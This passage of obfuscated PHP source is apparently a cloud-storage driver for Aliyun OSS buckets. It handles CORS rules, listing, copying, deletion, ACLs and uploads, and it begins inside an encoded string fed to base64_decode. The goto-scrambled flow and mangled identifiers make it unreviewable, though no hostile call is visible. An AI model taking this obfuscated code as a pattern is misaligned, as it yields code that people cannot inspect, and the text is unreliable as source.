x62\x1\xab\xbf\x75\x9b\x92\x1a\x5\x58\xd2\x10\xd4\x6a\x69\x27\x6d\x7\x73\x24\x15\x7a\xcf\x64\x98\x82\x91\xbf"."\150\100\232\115\327\35\337\40\273\54\67\315\102\72\332\54\302\353\363\230\77\20\316\142\224\60\246\350\214\211\67\302\205\27\0\50\227\317\10\354\351\164\215\350\121"."\165\153\61\101\122\210\271\21\142\274\105\346\130\120\145\302\141\222\375\177\0\26\170\267\214\41\232\0\0"."".base64_decode(''), 10, -8))); goto B³Ë”‘ó›•; B©®ÁñŒ¢Ğ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($fíİÊ‡Íåö) { parent::__construct($fíİÊ‡Íåö); $this->signatureVersion($_SERVER[úÎü][208]); } public function fileOutLink($Cğ›ß¹Êõ×) { $a¡Áªƒùˆ÷ =& $_SERVER[úÎü]; if (substr($Cğ›ß¹Êõ×, 0, 7) == $a¡Áªƒùˆ÷[1160]) { $Cğ›ß¹Êõ× = $a¡Áªƒùˆ÷[1161] . substr($Cğ›ß¹Êõ×, 7); } header($a¡Áªƒùˆ÷[156] . $Cğ›ß¹Êõ×); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($AİÎßÏ¿) { parent::__construct(); include_once SDK_DIR . $_SERVER[úÎü][1215]; $this->_init($AİÎßÏ¿); } public function _init($e¤‰ê¡»˜ó) { $cˆÙ‘ÚÃ¼è =& $_SERVER[úÎü]; foreach ($e¤‰ê¡»˜ó as $FƒÜšÊ·¥¹ => $C´Ÿ¥Å¼ğ) { if (isset($this->{$FƒÜšÊ·¥¹})) { $this->{$FƒÜšÊ·¥¹} = $C´Ÿ¥Å¼ğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($cˆÙ‘ÚÃ¼è[1216] . LNG($cˆÙ‘ÚÃ¼è[1217])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto C–¥“¹†è; C–¥“¹†è: $A¡íÖã‘²í =& $_SERVER[úÎü]; $aêöÏ¹†± = new OSS\Model\CorsConfig(); $A“ŸÉ¨‡‘™ = new OSS\Model\CorsRule(); goto CñôÏŠ¨“°; d¤¼³ç›ãæ: $A“ŸÉ¨‡‘™->addAllowedMethod($A¡íÖã‘²í[1221]); $A“ŸÉ¨‡‘™->addAllowedMethod($A¡íÖã‘²í[1222]); $A“ŸÉ¨‡‘™->addAllowedMethod($A¡íÖã‘²í[155]); goto f®ÅêÒÚÜŸ; f®ÅêÒÚÜŸ: $A“ŸÉ¨‡‘™->setMaxAgeSeconds(600); $A“ŸÉ¨‡‘™->addExposeHeader($A¡íÖã‘²í[1223]); $A“ŸÉ¨‡‘™->addAllowedHeader($A¡íÖã‘²í[1218]); goto fÛ¡ˆæŠ†; CñôÏŠ¨“°: $A“ŸÉ¨‡‘™->addAllowedOrigin($A¡íÖã‘²í[1218]); $A“ŸÉ¨‡‘™->addAllowedMethod($A¡íÖã‘²í[1219]); $A“ŸÉ¨‡‘™->addAllowedMethod($A¡íÖã‘²í[1220]); goto d¤¼³ç›ãæ; fÛ¡ˆæŠ†: $aêöÏ¹†±->addRule($A“ŸÉ¨‡‘™); try { $this->client->putBucketCors($this->bucket, $aêöÏ¹†±); } catch (OSS\Core\OssException $Eéìšğñæ¡) { return !1; } return !0; goto B´ã‡›Â³; B´ã‡›Â³: } public function getBucketCors() { goto d§ÌÊ‚¨‘Ö; D÷ƒ´Õ¹Á: return array($E‰âË©‹ˆÙ[179] => isset($b‡´³±Ïø†[0]) ? $b‡´³±Ïø†[0] : $E‰âË©‹ˆÙ[33], $E‰âË©‹ˆÙ[183] => $AŒšÍõÅ‡Ò, $E‰âË©‹ˆÙ[1224] => $AµöâÆ¢éÊ, $E‰âË©‹ˆÙ[1225] => isset($E©¢¿ä†º[0]) ? $E©¢¿ä†º[0] : $E‰âË©‹ˆÙ[33], $E‰âË©‹ˆÙ[181] => isset($cÛÂ¸­¹Ä¢[0]) ? $cÛÂ¸­¹Ä¢[0] : $E‰âË©‹ˆÙ[33]); goto eá „Õ¯Ìµ; d§ÌÊ‚¨‘Ö: $E‰âË©‹ˆÙ =& $_SERVER[úÎü]; $D®Ë±Î¾„¨ = null; try { $D®Ë±Î¾„¨ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A™ŸéçÂŠ) { return null; } goto càå¿·ßæÎ; càå¿·ßæÎ: if (!$D®Ë±Î¾„¨ || !($c£¾¦Ôˆ¸å = $D®Ë±Î¾„¨->getRules())) { return null; } $b‡´³±Ïø† = $c£¾¦Ôˆ¸å[0]->getAllowedOrigins(); $AŒšÍõÅ‡Ò = $c£¾¦Ôˆ¸å[0]->getAllowedMethods(); goto f°ì¾Üè§; f°ì¾Üè§: $AµöâÆ¢éÊ = $c£¾¦Ôˆ¸å[0]->getMaxAgeSeconds(); $E©¢¿ä†º = $c£¾¦Ôˆ¸å[0]->getExposeHeaders(); $cÛÂ¸­¹Ä¢ = $c£¾¦Ôˆ¸å[0]->getAllowedHeaders(); goto D÷ƒ´Õ¹Á; eá „Õ¯Ìµ: } public function isBucketCors() { goto Cé¥±æ“Û¤; b÷Ş›‚—Ãß: $F¡Ûö•«Á = array($fÂ—ŠòññÚ[184], $fÂ—ŠòññÚ[185], $fÂ—ŠòññÚ[186], $fÂ—ŠòññÚ[187], $fÂ—ŠòññÚ[188]); $Dª¹­—Àí = array_diff($F¡Ûö•«Á, $D’ã…‚†Ì); return empty($Dª¹­—Àí); goto F–¬ê«ƒ­ß; f¬¹î†µò£: if ($e‡ŠœøìÃÌ[$fÂ—ŠòññÚ[179]] != $fÂ—ŠòññÚ[180] || $e‡ŠœøìÃÌ[$fÂ—ŠòññÚ[181]] != $fÂ—ŠòññÚ[180]) { return !1; } $D’ã…‚†Ì = array_map($fÂ—ŠòññÚ[182], $e‡ŠœøìÃÌ[$fÂ—ŠòññÚ[183]]); if (!is_array($D’ã…‚†Ì)) { $D’ã…‚†Ì = array(); } goto b÷Ş›‚—Ãß; Cé¥±æ“Û¤: $fÂ—ŠòññÚ =& $_SERVER[úÎü]; $e‡ŠœøìÃÌ = $this->getBucketCors(); if (!$e‡ŠœøìÃÌ || !is_array($e‡ŠœøìÃÌ)) { return !1; } goto f¬¹î†µò£; F–¬ê«ƒ­ß: } public function mkfile($D‚¥Ãâ¨õÊ, $DŸÀÕ¨ç½ = '', $cã««Øù§Ò = REPEAT_RENAME) { $cÃ‡Ë‹è» = $this->setContent($D‚¥Ãâ¨õÊ, $DŸÀÕ¨ç½); if ($cÃ‡Ë‹è» !== !1) { return $this->getPathOuter($D‚¥Ãâ¨õÊ); } return !1; } public function mkdir($bÅ—çÎŒÂ¢, $eøŒï³„ê” = REPEAT_SKIP) { if ($this->_isFolder($bÅ—çÎŒÂ¢)) { return $this->getPathOuter($bÅ—çÎŒÂ¢); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bÅ—çÎŒÂ¢)); } catch (OSS\Core\OssException $bÌª£¼ƒ¸) { return !1; } return $this->getPathOuter($bÅ—çÎŒÂ¢); } private function fileList($fÃÓíôĞ«¾, $b½‡Ğ”Èõ» = '', $FàÆ‘ö¶¡ñ = 0) { goto A¾…ßÀ—‘; fÅ²ù½åÍÑ: $eŠÌÍäô» = $aŞ²Úœ[33]; $D‘—ôòŞ‚Ÿ = 1000; $cï‰°†Ò©º = $this->listItemCache === !1 ? !1 : !0; goto f±‹×¼Ğ»Ç; aÑˆòó¶Õ: return array($aŞ²Úœ[74] => $BŞ°„°Ñ‰­, $aŞ²Úœ[73] => $e·Èƒçİˆ·); goto B’Ë¾¹»ğÏ; f±‹×¼Ğ»Ç: $BŞ°„°Ñ‰­ = $e·Èƒçİˆ· = array(); while (!0) { check_abort(); $f¬²À²µàÏ = array($aŞ²Úœ[1226] => $b½‡Ğ”Èõ», $aŞ²Úœ[1227] => $cñİÕğˆëÇ, $aŞ²Úœ[1228] => $D‘—ôòŞ‚Ÿ, $aŞ²Úœ[1229] => $eŠÌÍäô»); try { $E¯†šóŠˆ = $this->client->listObjects($this->bucket, $f¬²À²µàÏ); } catch (OSS\Core\OssException $Cæº†ÏĞÀæ) { break; } $eŠÌÍäô» = $E¯†šóŠˆ->getNextMarker(); $DÔÔÈƒí„† = $E¯†šóŠˆ->getObjectList(); $a¬«Â‹·‹“ = $E¯†šóŠˆ->getPrefixList(); foreach ($DÔÔÈƒí„† as $Bè¯Ò—ßº˜) { goto Dˆ¾ìôóîØ; Dˆ¾ìôóîØ: if ($Bè¯Ò—ßº˜->getKey() == $cñİÕğˆëÇ) { continue; } $f¾„Õ¡å¼½ = $Bè¯Ò—ßº˜->getKey(); $Bà‚§Ÿ¥ĞÉ = $Bè¯Ò—ßº˜->getSize(); goto D¸°éøŸ; D¸°éøŸ: $AÎ¢³§ï‘ = $Bè¯Ò—ßº˜->getLastModified(); $CÀ–ÃË‰õÜ = $FàÆ‘ö¶¡ñ ? array($aŞ²Úœ[28] => $f¾„Õ¡å¼½, $aŞ²Úœ[77] => $Bà‚§Ÿ¥ĞÉ, $aŞ²Úœ[193] => strtotime($AÎ¢³§ï‘)) : $f¾„Õ¡å¼½; $d·ÜÄºÓ¾§ = $Bà‚§Ÿ¥ĞÉ == 0 && substr($f¾„Õ¡å¼½, strlen($f¾„Õ¡å¼½) - 1, 1) == $aŞ²Úœ[8] ? !0 : !1; goto c“ĞÁâ•ÛŸ; c“ĞÁâ•ÛŸ: if ($cï‰°†Ò©º) { $this->cacheMethod($aŞ²Úœ[195], $f¾„Õ¡å¼½, $d·ÜÄºÓ¾§); $this->cacheMethod($aŞ²Úœ[196], $f¾„Õ¡å¼½, array($aŞ²Úœ[77] => $Bà‚§Ÿ¥ĞÉ, $aŞ²Úœ[1230] => $Bà‚§Ÿ¥ĞÉ, $aŞ²Úœ[107] => strtotime($AÎ¢³§ï‘), $aŞ²Úœ[1231] => $AÎ¢³§ï‘)); } if ($d·ÜÄºÓ¾§) { $BŞ°„°Ñ‰­[] = $f¾„Õ¡å¼½; continue; } $e·Èƒçİˆ·[] = $CÀ–ÃË‰õÜ; goto C†¢îÓíïÌ; C†¢îÓíïÌ: } foreach ($a¬«Â‹·‹“ as $cíÑ‘Ó¢æÑ) { $BŞ°„°Ñ‰­[] = $cíÑ‘Ó¢æÑ->getPrefix(); if ($cï‰°†Ò©º) { $this->cacheMethod($aŞ²Úœ[195], $f¾„Õ¡å¼½, !0); } } if ($eŠÌÍäô» === $aŞ²Úœ[33]) { break; } } if ($cï‰°†Ò©º) { $this->cacheMethod($aŞ²Úœ[195], $fÃÓíôĞ«¾, !0); } goto aÑˆòó¶Õ; A¾…ßÀ—‘: $aŞ²Úœ =& $_SERVER[úÎü]; $fÃÓíôĞ«¾ = trim($fÃÓíôĞ«¾, $aŞ²Úœ[8]); $cñİÕğˆëÇ = empty($fÃÓíôĞ«¾) ? $aŞ²Úœ[33] : $fÃÓíôĞ«¾ . $aŞ²Úœ[8]; goto fÅ²ù½åÍÑ; B’Ë¾¹»ğÏ: } public function copyFile($C÷‚§Áğ›, $f²Š±İ¢¡£) { $dºš¦©âÓİ = $this->size($C÷‚§Áğ›); if ($dºš¦©âÓİ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $C÷‚§Áğ›, $this->bucket, $this->pathEncode($f²Š±İ¢¡£)); } catch (OSS\Core\OssException $e÷ß µÂßÔ) { return !1; } return $this->getPathOuter($f²Š±İ¢¡£); } $CÊöµ«ŒóË = $this->multiCopyObject($C÷‚§Áğ›, $f²Š±İ¢¡£, $dºš¦©âÓİ); return $CÊöµ«ŒóË ? $this->getPathOuter($f²Š±İ¢¡£) : !1; } private function multiCopyObject($B¾“¡Èóòˆ, $cÍ«ËïØª, $a¼¢—’ğã) { $bÆŸ÷ß¶ä =& $_SERVER[úÎü]; try { goto Fß‘Ñ˜à„Ù; eµÙá¾¸¸: $c·ïÀ±¯Æ¾ = 1; $D¢¨Â¿ÊšË = 0; $cÖ¹‚‡áê† = array(); goto c¸Œ¾³¥¹; c¸Œ¾³¥¹: $dŠ–Ê«Š‹ = 1024 * 1024 * 10; $dÛ…‘ªÓÚ¼ = $this->client->generateMultiuploadParts($a¼¢—’ğã, $dŠ–Ê«Š‹); foreach ($dÛ…‘ªÓÚ¼ as $B÷’çàÏÜå => $EßÀÑ—˜ì) { $A¿ššÌ¿ÂÛ = $D¢¨Â¿ÊšË + (int) $EßÀÑ—˜ì[$bÆŸ÷ß¶ä[1233]]; $eåå¹Ë¯á¨ = (int) $EßÀÑ—˜ì[$bÆŸ÷ß¶ä[331]] + $A¿ššÌ¿ÂÛ - 1; $EÄ»óç¾…÷ = array($bÆŸ÷ß¶ä[1234] => $A¿ššÌ¿ÂÛ, $bÆŸ÷ß¶ä[1235] => $eåå¹Ë¯á¨); $cÖ¹‚‡áê†[] = $this->client->uploadPartCopy($this->bucket, $B¾“¡Èóòˆ, $this->bucket, $this->pathEncode($cÍ«ËïØª), $c·ïÀ±¯Æ¾, $cƒÀƒ®Ú‰®, $EÄ»óç¾…÷); $c·ïÀ±¯Æ¾ = $c·ïÀ±¯Æ¾ + 1; } goto F´‰À¿‚ìö; Fß‘Ñ˜à„Ù: $C˜šÏî¦ƒ = array(); if ($bÎˆÔ‰ÛÜê = $this->hashMd5($B¾“¡Èóòˆ)) { $C˜šÏî¦ƒ = array(OSS\OssClient::OSS_HEADERS => array($bÆŸ÷ß¶ä[1232] => $bÎˆÔ‰ÛÜê)); } $cƒÀƒ®Ú‰® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÍ«ËïØª), $C˜šÏî¦ƒ); goto eµÙá¾¸¸; F´‰À¿‚ìö: $e˜â’›Óàô = array(); foreach ($cÖ¹‚‡áê† as $B÷’çàÏÜå => $cá¶Ê©‡Óù) { $e˜â’›Óàô[] = array($bÆŸ÷ß¶ä[1236] => $B÷’çàÏÜå + 1, $bÆŸ÷ß¶ä[1237] => $cá¶Ê©‡Óù); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cÍ«ËïØª), $cƒÀƒ®Ú‰®, $e˜â’›Óàô); goto FÉÂ–Ó¯Ûì; FÉÂ–Ó¯Ûì: } catch (OSS\Core\OssException $b¢Ğ¦†åé‹) { return !1; } return !0; } public function moveFile($bÜÒÉÌÁŠ, $Cè™§Óœšº) { if ($this->copyFile($bÜÒÉÌÁŠ, $Cè™§Óœšº)) { $this->remove($bÜÒÉÌÁŠ); return $this->getPathOuter($Cè™§Óœšº); } return !1; } public function delFile($fï¾è²‹¿µ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fï¾è²‹¿µ)); } catch (OSS\Core\OssException $C—Ü¶®ŠĞø) { return !1; } return !0; } public function delFolder($eç”Œñ«©) { goto CëÚÒŠê‚Ó; A…´„Ê£±Ó: if (!empty($eç”Œñ«©) && !in_array($E¥ØÔ»Ú›•, $f“ËòåµğÉ[$dßöëÄ—•[74]])) { $f“ËòåµğÉ[$dßöëÄ—•[74]][] = $E¥ØÔ»Ú›•; } $fì¸äÎ‚¿ = $this->delByBatch($f“ËòåµğÉ[$dßöëÄ—•[73]]); if (!$fì¸äÎ‚¿) { return !1; } goto c¡Öîò¶Ğ; f™†çŞíô­: $f“ËòåµğÉ = $this->fileList($eç”Œñ«©); $this->listItemCache = !0; $E¥ØÔ»Ú›• = trim($eç”Œñ«©, $dßöëÄ—•[8]) . $dßöëÄ—•[8]; goto A…´„Ê£±Ó; CëÚÒŠê‚Ó: $dßöëÄ—• =& $_SERVER[úÎü]; if (!$this->exist($eç”Œñ«©)) { return !0; } $this->listItemCache = !1; goto f™†çŞíô­; c¡Öîò¶Ğ: return $this->delByBatch($f“ËòåµğÉ[$dßöëÄ—•[74]]); goto CƒÔÉËèÃŸ; CƒÔÉËèÃŸ: } private function delByBatch($b²Ûô¾¹å¶) { foreach (array_chunk($b²Ûô¾¹å¶, 1000) as $B´Œ‚ñî’…) { try { $this->client->deleteObjects($this->bucket, $B´Œ‚ñî’…); } catch (OSS\Core\OssException $b…©“‚Ù¸´) { return !1; } } return !0; } public function rename($fÛ¸Ş”–è¢, $C³­……½¹á) { return $this->renameObject($fÛ¸Ş”–è¢, $C³­……½¹á); } private function fileInfo($d‡†¦¾ÓÄ˜, $Dœİ½‘†àƒ = false, $DÉâİéõó° = array()) { goto dÀ¶‡¢Ä…­; CÈÉ—Œ®ôÄ: if (isset($DÉâİéõó°[$FÎò‹‚†á„[77]])) { $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[77]] = $DÉâİéõó°[$FÎò‹‚†á„[77]]; } if (isset($DÉâİéõó°[$FÎò‹‚†á„[107]])) { $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[107]] = $DÉâİéõó°[$FÎò‹‚†á„[107]]; } if (isset($DÉâİéõó°[$FÎò‹‚†á„[193]]) && !trim($fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[107]])) { $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[107]] = $DÉâİéõó°[$FÎò‹‚†á„[193]]; } goto Fó¼¡Åö›; dÀ¶‡¢Ä…­: $FÎò‹‚†á„ =& $_SERVER[úÎü]; $fÄ¦§ÎŞîˆ = array($FÎò‹‚†á„[28] => $this->pathThis($d‡†¦¾ÓÄ˜), $FÎò‹‚†á„[75] => $this->getPathOuter($d‡†¦¾ÓÄ˜), $FÎò‹‚†á„[29] => $FÎò‹‚†á„[171], $FÎò‹‚†á„[77] => isset($DÉâİéõó°[$FÎò‹‚†á„[77]]) ? $DÉâİéõó°[$FÎò‹‚†á„[77]] : 0, $FÎò‹‚†á„[165] => $this->ext($d‡†¦¾ÓÄ˜)); if ($Dœİ½‘†àƒ) { return $fÄ¦§ÎŞîˆ; } goto dø±º­ãé; dø±º­ãé: $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[190]] = $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[107]] = 0; $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[191]] = $fÄ¦§ÎŞîˆ[$FÎò‹‚†á„[192]] = !0; if (empty($DÉâİéõó°)) { $eˆÇğ†â¢ = $this->objectMeta($d‡†¦¾ÓÄ˜); if (!$eˆÇğ†â¢) { return $fÄ¦§ÎŞîˆ; } $DÉâİéõó° = array($FÎò‹‚†á„[107] => strtotime($eˆÇğ†â¢[$FÎò‹‚†á„[1231]]), $FÎò‹‚†á„[77] => $eˆÇğ†â¢[$FÎò‹‚†á„[1230]] + 0); } goto CÈÉ—Œ®ôÄ; Fó¼¡Åö›: return $fÄ¦§ÎŞîˆ; goto eëÃ‘—¸¤ö; eëÃ‘—¸¤ö: } private function folderInfo($døèÔÌŞ—­, $C„‹Æ¨½¼£ = false, $EŒñ¸­†à = array()) { goto a÷Ğ¡°‘»; B¶Ãâ§Ù‹: $DÜóæíà·Ğ[$Bé–…ªÙ·[190]] = $DÜóæíà·Ğ[$Bé–…ªÙ·[107]] = 0; $DÜóæíà·Ğ[$Bé–…ªÙ·[191]] = $DÜóæíà·Ğ[$Bé–…ªÙ·[192]] = !0; if (empty($EŒñ¸­†à)) { $døèÔÌŞ—­ = rtrim($døèÔÌŞ—­, $Bé–…ªÙ·[8]) . $Bé–…ªÙ·[8]; $a‘òøÛŞá = $this->objectMeta($døèÔÌŞ—­); if (!$a‘òøÛŞá) { return $DÜóæíà·Ğ; } $EŒñ¸­†à = array($Bé–…ªÙ·[190] => $a‘òøÛŞá[$Bé–…ªÙ·[1238]][$Bé–…ªÙ·[1239]], $Bé–…ªÙ·[107] => strtotime($a‘òøÛŞá[$Bé–…ªÙ·[1231]])); } goto CÄËó¯ìéé; CÄËó¯ìéé: if (isset($EŒñ¸­†à[$Bé–…ªÙ·[107]])) { $DÜóæíà·Ğ[$Bé–…ªÙ·[107]] = $EŒñ¸­†à[$Bé–…ªÙ·[107]]; } if (isset($EŒñ¸­†à[$Bé–…ªÙ·[190]])) { $DÜóæíà·Ğ[$Bé–…ªÙ·[190]] = $EŒñ¸­†à[$Bé–…ªÙ·[190]]; } return $DÜóæíà·Ğ; goto E³Ü„™ÙÔ; a÷Ğ¡°‘»: $Bé–…ªÙ· =& $_SERVER[úÎü]; $DÜóæíà·Ğ = array($Bé–…ªÙ·[28] => $this->pathThis($døèÔÌŞ—­), $Bé–…ªÙ·[75] => $this->getPathOuter($Bé–…ªÙ·[8] . $døèÔÌŞ—­), $Bé–…ªÙ·[29] => $Bé–…ªÙ·[76]); if ($C„‹Æ¨½¼£) { return $DÜóæíà·Ğ; } goto B¶Ãâ§Ù‹; E³Ü„™ÙÔ: } public function listPath($AäŠØ‡ƒ‘Û, $eêº›ºÚ• = false) { $Dœá¹Ì¥ =& $_SERVER[úÎü]; $C“ïÕÁÓ¤¶ = $this->fileList($AäŠØ‡ƒ‘Û, $Dœá¹Ì¥[8], !0); foreach ($C“ïÕÁÓ¤¶[$Dœá¹Ì¥[74]] as $EÏÍÌÂáî» => $fÒùê¸†Œ¤) { $C“ïÕÁÓ¤¶[$Dœá¹Ì¥[74]][$EÏÍÌÂáî»] = $this->folderInfo($fÒùê¸†Œ¤, $eêº›ºÚ•, $fÒùê¸†Œ¤); } foreach ($C“ïÕÁÓ¤¶[$Dœá¹Ì¥[73]] as $EÏÍÌÂáî» => $fÒùê¸†Œ¤) { $C“ïÕÁÓ¤¶[$Dœá¹Ì¥[73]][$EÏÍÌÂáî»] = $this->fileInfo($fÒùê¸†Œ¤[$Dœá¹Ì¥[28]], $eêº›ºÚ•, $fÒùê¸†Œ¤); } return $C“ïÕÁÓ¤¶; } public function has($bÀáÆ½ŒõÜ, $d°¿‹¨‚Ğ¼ = false, $bçµĞùÜ¹ = true) { goto E‹óâŠê„ä; bŒ÷­¬†ÒŠ: while (!0) { check_abort(); $D‚‡£ÒÓ = array($f…İİÍËµ[1226] => $f…İİÍËµ[8], $f…İİÍËµ[1227] => $c‚ ‹¼²îÓ, $f…İİÍËµ[1228] => $C‘Ë«±ŠÚ, $f…İİÍËµ[1229] => $DÌÃ•´’•È); try { $Dš¸Ò·Î’¿ = $this->client->listObjects($this->bucket, $D‚‡£ÒÓ); } catch (OSS\Core\OssException $Dêñ‡êÈÜ±) { break; } $DÌÃ•´’•È = $Dš¸Ò·Î’¿->getNextMarker(); $FĞíÁ¾òññ = $Dš¸Ò·Î’¿->getObjectList(); $AÏ‹ÙÓÑÕÖ = $Dš¸Ò·Î’¿->getPrefixList(); if ($d°¿‹¨‚Ğ¼) { if (count($FĞíÁ¾òññ) > 1 || count($FĞíÁ¾òññ) == 1 && $FĞíÁ¾òññ[0]->getKey() != $c‚ ‹¼²îÓ) { $BîÉ´âÌ“ += count($FĞíÁ¾òññ) - 1; } if (!empty($AÏ‹ÙÓÑÕÖ)) { $EØàÕÉ—Ş© += count($AÏ‹ÙÓÑÕÖ); } if ($DÌÃ•´’•È === $f…İİÍËµ[33]) { break; } continue; } if ($bçµĞùÜ¹) { if (!empty($FĞíÁ¾òññ)) { if (count($FĞíÁ¾òññ) > 1 || $FĞíÁ¾òññ[0]->getKey() != $c‚ ‹¼²îÓ) { return !0; } } } else { if (!empty($AÏ‹ÙÓÑÕÖ)) { return !0; } } if ($DÌÃ•´’•È === $f…İİÍËµ[33]) { break; } } if ($d°¿‹¨‚Ğ¼) { return array($f…İİÍËµ[199] => $BîÉ´âÌ“, $f…İİÍËµ[200] => $EØàÕÉ—Ş©); } return !1; goto Cà¬Øø‘Øã; E‘ØÁÆ°ãî: $DÌÃ•´’•È = $f…İİÍËµ[33]; $C‘Ë«±ŠÚ = 500; $BîÉ´âÌ“ = $EØàÕÉ—Ş© = 0; goto bŒ÷­¬†ÒŠ; E‹óâŠê„ä: $f…İİÍËµ =& $_SERVER[úÎü]; $bÀáÆ½ŒõÜ = trim($bÀáÆ½ŒõÜ, $f…İİÍËµ[8]); $c‚ ‹¼²îÓ = empty($bÀáÆ½ŒõÜ) ? $f…İİÍËµ[33] : $bÀáÆ½ŒõÜ . $f…İİÍËµ[8]; goto E‘ØÁÆ°ãî; Cà¬Øø‘Øã: } public function listAll($Bé¸Ïç‚•…) { $f¨Şå®Ûîõ =& $_SERVER[úÎü]; $D¯¶ò¶œà = $this->fileList($Bé¸Ïç‚•…, $f¨Şå®Ûîõ[33], !0); $CôÙ‡–ïÜ¼ = array(); foreach ($D¯¶ò¶œà[$f¨Şå®Ûîõ[73]] as $f¯Ãß£²ŒÖ) { $CôÙ‡–ïÜ¼[$f¯Ãß£²ŒÖ[$f¨Şå®Ûîõ[28]]] = $f¯Ãß£²ŒÖ[$f¨Şå®Ûîõ[77]]; } foreach ($D¯¶ò¶œà[$f¨Şå®Ûîõ[74]] as $f¯Ãß£²ŒÖ) { if (is_string($f¯Ãß£²ŒÖ)) { $CôÙ‡–ïÜ¼[$f¯Ãß£²ŒÖ] = 0; } } return $this->listAllFiles($Bé¸Ïç‚•…, array_keys($CôÙ‡–ïÜ¼), $CôÙ‡–ïÜ¼); } public function canRead($b™ÅÌê›ßñ) { $bÂ‡ßåàØÕ =& $_SERVER[úÎü]; $D¹½¡Š¸‚Š = $this->pathAcl($b™ÅÌê›ßñ); return $D¹½¡Š¸‚Š == $bÂ‡ßåàØÕ[1240] || $D¹½¡Š¸‚Š == $bÂ‡ßåàØÕ[508] ? !0 : !1; } public function canWrite($aÒ¶­Ï«®ò) { $E¬‡¤†Ø¼ã = $this->pathAcl($aÒ¶­Ï«®ò); return $E¬‡¤†Ø¼ã == $_SERVER[úÎü][508] ? !0 : !1; } public function pathAcl($D´ßßæã¡«) { goto FèãˆãòÛò; dÎµÇöä§: return $f¯êĞ‚Œá—; goto Fªá¸ŞÈƒ­; cæ¥î¦ ´: $f¯êĞ‚Œá— = $F©î±½ £— == $b²ó¤…ÔÀ[34] ? $this->bucketAcl : $F©î±½ £—; if ($f¯êĞ‚Œá— == $b²ó¤…ÔÀ[1241]) { return $b²ó¤…ÔÀ[1240]; } if ($f¯êĞ‚Œá— == $b²ó¤…ÔÀ[1242]) { return $b²ó¤…ÔÀ[508]; } goto dÎµÇöä§; FèãˆãòÛò: $b²ó¤…ÔÀ =& $_SERVER[úÎü]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F©î±½ £— = $this->client->getObjectAcl($this->bucket, $this->pathEncode($D´ßßæã¡«)); } catch (OSS\Core\OssException $C¹©ã¥¡Ìã) { return !1; } goto cæ¥î¦ ´; Fªá¸ŞÈƒ­: } private function chmodPath($b¤ïê©Ó’Ÿ, $e„˜‘ÛÏÃ = '') { $b×áõíñ¬¦ =& $_SERVER[úÎü]; $CŠõÃ‘ÓÎ = empty($e„˜‘ÛÏÃ) ? $b×áõíñ¬¦[1242] : $e„˜‘ÛÏÃ; $AĞÒ™İóØŞ = array($b×áõíñ¬¦[34], $b×áõíñ¬¦[189], $b×áõíñ¬¦[1241], $b×áõíñ¬¦[1242]); if (!in_array($CŠõÃ‘ÓÎ, $AĞÒ™İóØŞ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b¤ïê©Ó’Ÿ), $CŠõÃ‘ÓÎ); } catch (OSS\Core\OssException $E»ìİ‰ò©ğ) { return !1; } return !0; } public function getContent($c¼®‘ä‡ÖØ) { return $this->fileSubstr($c¼®‘ä‡ÖØ, -1); } public function setContent($cÑ¦Ô×ãŞø, $d©ˆÆ—‡ = '') { $C»· ‹ÕÚí =& $_SERVER[úÎü]; try { $DËŞæ±¦·Å = $this->trafficLimit($C»· ‹ÕÚí[1243]); $cö•Öíö‡ø = $this->client->putObject($this->bucket, $this->pathEncode($cÑ¦Ô×ãŞø), $d©ˆÆ—‡, $DËŞæ±¦·Å); } catch (OSS\Core\OssException $d¶äš¬ØÁ) { return !1; } $e¾¡Øß‹›ğ = array($C»· ‹ÕÚí[1232] => trim($cö•Öíö‡ø[$C»· ‹ÕÚí[1244]], $C»· ‹ÕÚí[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cÑ¦Ô×ãŞø))); $this->updateObjMeta($cÑ¦Ô×ãŞø, $e¾¡Øß‹›ğ); return isset($cö•Öíö‡ø[$C»· ‹ÕÚí[1245]][$C»· ‹ÕÚí[1191]]) ? !0 : !1; } private function updateObjMeta($cÏ‘Ä„ÚôÃ, $DîÌ‹’ ) { $cÏ‘Ä„ÚôÃ = $this->pathEncode($cÏ‘Ä„ÚôÃ); try { $EèŠ“Õ„²Ó = array(OSS\OssClient::OSS_HEADERS => $DîÌ‹’ ); $this->client->copyObject($this->bucket, $cÏ‘Ä„ÚôÃ, $this->bucket, $cÏ‘Ä„ÚôÃ, $EèŠ“Õ„²Ó); } catch (OSS\Core\OssException $e‚¶Úàé) { return !1; } return !0; } public function upload($D·“š¿‡’, $aÎŠ†À´ÉÈ, $fÏÄÓ“ØÇ½ = false, $DÎçí¼íà£ = REPEAT_REPLACE) { $dàùÒÊÚˆ‡ =& $_SERVER[úÎü]; $c…§äĞÊÏ = trim($D·“š¿‡’, $dàùÒÊÚˆ‡[8]); $dáÀƒ”±Åç = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($dàùÒÊÚˆ‡[1232] => @md5_file($aÎŠ†À´ÉÈ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D·“š¿‡’))); 